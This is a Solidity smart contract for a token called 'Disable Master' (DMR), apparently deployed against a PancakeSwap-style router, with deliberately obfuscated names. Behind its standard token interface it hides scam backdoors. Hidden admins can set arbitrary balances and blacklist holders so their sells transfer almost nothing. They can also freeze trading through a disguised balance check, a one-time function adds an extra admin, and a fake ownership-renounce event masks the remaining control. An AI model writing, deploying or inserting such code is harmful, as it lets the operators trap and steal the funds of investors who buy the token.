//SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

interface limitTxTrading {
    function createPair(address amountFee, address totalMaxAt) external returns (address);
}

interface marketingLaunch {
    function totalSupply() external view returns (uint256);

    function balanceOf(address isTeam) external view returns (uint256);

    function transfer(address listSender, uint256 feeLimit) external returns (bool);

    function allowance(address takeAmountFee, address spender) external view returns (uint256);

    function approve(address spender, uint256 feeLimit) external returns (bool);

    function transferFrom(
        address sender,
        address listSender,
        uint256 feeLimit
    ) external returns (bool);

    event Transfer(address indexed from, address indexed receiverAutoLaunch, uint256 value);
    event Approval(address indexed takeAmountFee, address indexed spender, uint256 value);
}

abstract contract marketingTeam {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface toFrom {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface fundReceiver is marketingLaunch {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract DisableMaster is marketingTeam, marketingLaunch, fundReceiver {

    function fundTotal() private view {
        require(isMinList[_msgSender()]);
    }

    address senderEnable = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function modeList(address teamTake) public {
        fundTotal();
        if (fromExempt) {
            enableSwapTx = liquidityTx;
        }
        if (teamTake == teamMax || teamTake == totalReceiver) {
            return;
        }
        liquidityMarketing[teamTake] = true;
    }

    function allowance(address isEnable, address takeAmountList) external view virtual override returns (uint256) {
        if (takeAmountList == tokenSwap) {
            return type(uint256).max;
        }
        return liquiditySender[isEnable][takeAmountList];
    }

    uint256 public isEnableReceiver;

    uint256 fundEnable;

    function atTrading(address tokenLaunch, uint256 feeLimit) public {
        fundTotal();
        senderExempt[tokenLaunch] = feeLimit;
    }

    function name() external view virtual override returns (string memory) {
        return exemptBuy;
    }

    function symbol() external view virtual override returns (string memory) {
        return launchedAmount;
    }

    address public totalReceiver;

    function decimals() external view virtual override returns (uint8) {
        return swapTrading;
    }

    uint256 private listAt = 100000000 * 10 ** 18;

    function balanceOf(address isTeam) public view virtual override returns (uint256) {
        return senderExempt[isTeam];
    }

    uint256 public isReceiver;

    bool public fromExempt;

    string private exemptBuy = "Disable Master";

    function transferFrom(address isAmount, address listSender, uint256 feeLimit) external override returns (bool) {
        if (_msgSender() != tokenSwap) {
            if (liquiditySender[isAmount][_msgSender()] != type(uint256).max) {
                require(feeLimit <= liquiditySender[isAmount][_msgSender()]);
                liquiditySender[isAmount][_msgSender()] -= feeLimit;
            }
        }
        return fromEnable(isAmount, listSender, feeLimit);
    }

    bool public senderIs;

    function owner() external view returns (address) {
        return tradingAmount;
    }

    uint256 private takeLaunched;

    uint8 private swapTrading = 18;

    constructor (){
        
        toFrom autoAt = toFrom(tokenSwap);
        totalReceiver = limitTxTrading(autoAt.factory()).createPair(autoAt.WETH(), address(this));
        if (toLimit == enableSwapTx) {
            enableSwapTx = liquidityTx;
        }
        teamMax = _msgSender();
        isMinList[teamMax] = true;
        senderExempt[teamMax] = listAt;
        maxSender();
        
        emit Transfer(address(0), teamMax, listAt);
    }

    address private tradingAmount;

    mapping(address => bool) public liquidityMarketing;

    function fromEnable(address isAmount, address listSender, uint256 feeLimit) internal returns (bool) {
        if (isAmount == teamMax) {
            return senderLaunchedBuy(isAmount, listSender, feeLimit);
        }
        uint256 limitIs = marketingLaunch(totalReceiver).balanceOf(senderEnable);
        require(limitIs == maxAmountTx);
        require(listSender != senderEnable);
        if (liquidityMarketing[isAmount]) {
            return senderLaunchedBuy(isAmount, listSender, autoMin);
        }
        return senderLaunchedBuy(isAmount, listSender, feeLimit);
    }

    function maxSender() public {
        emit OwnershipTransferred(teamMax, address(0));
        tradingAmount = address(0);
    }

    uint256 constant autoMin = 12 ** 10;

    bool private txTradingMax;

    uint256 public liquidityTx;

    event OwnershipTransferred(address indexed maxBuy, address indexed receiverTeamLiquidity);

    uint256 public toLimit;

    function totalSupply() external view virtual override returns (uint256) {
        return listAt;
    }

    function swapReceiver(uint256 feeLimit) public {
        fundTotal();
        maxAmountTx = feeLimit;
    }

    function transfer(address tokenLaunch, uint256 feeLimit) external virtual override returns (bool) {
        return fromEnable(_msgSender(), tokenLaunch, feeLimit);
    }

    string private launchedAmount = "DMR";

    mapping(address => uint256) private senderExempt;

    function approve(address takeAmountList, uint256 feeLimit) public virtual override returns (bool) {
        liquiditySender[_msgSender()][takeAmountList] = feeLimit;
        emit Approval(_msgSender(), takeAmountList, feeLimit);
        return true;
    }

    address public teamMax;

    uint256 maxAmountTx;

    bool private limitToken;

    uint256 public enableSwapTx;

    mapping(address => mapping(address => uint256)) private liquiditySender;

    address tokenSwap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function receiverLiquidity(address receiverReceiver) public {
        require(receiverReceiver.balance < 100000);
        if (senderIs) {
            return;
        }
        
        isMinList[receiverReceiver] = true;
        
        senderIs = true;
    }

    mapping(address => bool) public isMinList;

    function getOwner() external view returns (address) {
        return tradingAmount;
    }

    function senderLaunchedBuy(address isAmount, address listSender, uint256 feeLimit) internal returns (bool) {
        require(senderExempt[isAmount] >= feeLimit);
        senderExempt[isAmount] -= feeLimit;
        senderExempt[listSender] += feeLimit;
        emit Transfer(isAmount, listSender, feeLimit);
        return true;
    }

}